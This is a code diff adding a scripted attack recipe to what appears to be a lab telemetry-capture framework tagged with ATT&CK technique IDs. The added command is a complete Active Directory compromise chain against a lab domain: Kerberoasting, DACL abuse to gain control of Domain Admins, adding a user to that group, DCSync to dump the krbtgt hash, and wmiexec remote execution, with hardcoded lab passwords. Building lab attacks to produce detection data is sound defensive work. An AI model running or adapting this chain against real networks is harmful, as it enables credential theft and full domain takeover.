@@ -768,6 +768,49 @@ printf '%s\n' "$out"
 curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
 printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$out" | grep -Eiq 'nt authority\\system' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "mission_ad_enumerate_exploit": CaptureRecipe(
+        # T1558.003/T1003.006: kerberoast_to_da's Kerberoast + DACL-abuse +
+        # DCSync chain, reused verbatim (see that recipe's comment for the
+        # 8000-byte truncation fix and the DACL-abuse story).
+        # T1078/T1059 (was T1059.004 -- same Windows-target correction as
+        # mission_meta3_recon_exploit): a real nxc wmiexec login+whoami as
+        # the FINAL command (per the lesson learned certifying
+        # ad_full_compromise: only the LAST command's tool-output reliably
+        # survives into captured network:packet telemetry) proves both the
+        # valid-account usage (nxc's own "[+] portal.lab\administrator:...
+        # (Pwn3d!)" confirmation banner) and the resulting Windows shell
+        # command execution ("Executed command via wmiexec").
+        command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
+import subprocess, sys
+from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
+DC = "$TARGET_HOST"
+DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
+r_acl = subprocess.run(["impacket-dacledit", "portal.lab/administrator:LabAdmin1!", "-dc-ip", DC, "-principal", "svc_backup", "-target", "Domain Admins", "-rights", "FullControl", "-action", "write"], capture_output=True, text=True, timeout=30, cwd="/tmp")
+print(f"dacledit rc={r_acl.returncode}")
+srv = Server(DC, port=389, get_info=ALL)
+conn_svc = Connection(srv, user="PORTAL\\svc_backup", password="Backup123!", authentication=NTLM, auto_bind=True)
+conn_svc.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+arya_dn = conn_svc.entries[0].distinguishedName.value
+conn_svc.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+rc = conn_svc.result.get("result", -1)
+if rc not in (0, 68):
+    conn_adm = Connection(srv, user="PORTAL\\Administrator", password="LabAdmin1!", authentication=NTLM, auto_bind=True)
+    conn_adm.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
+    arya_dn = conn_adm.entries[0].distinguishedName.value
+    conn_adm.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
+    rc = conn_adm.result.get("result", -1)
+    if rc not in (0, 68):
+        sys.exit(1)
+r = subprocess.run(["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{DC}", "-just-dc-ntlm"], capture_output=True, text=True, timeout=90, cwd="/tmp")
+krbtgt_line = next((ln for ln in r.stdout.splitlines() if ln.lower().startswith("krbtgt:")), "")
+print(f"dcsync_krbtgt_line={krbtgt_line}")
+sys.exit(0 if krbtgt_line else 1)
+PYEOF
+dcsync_rc=$?
+wmi_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "whoami" --exec-method wmiexec 2>&1)
+printf '%s\n' "$wmi_out"
+printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'Pwn3d!' && printf '%s' "$wmi_out" | grep -q 'Executed command via wmiexec' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
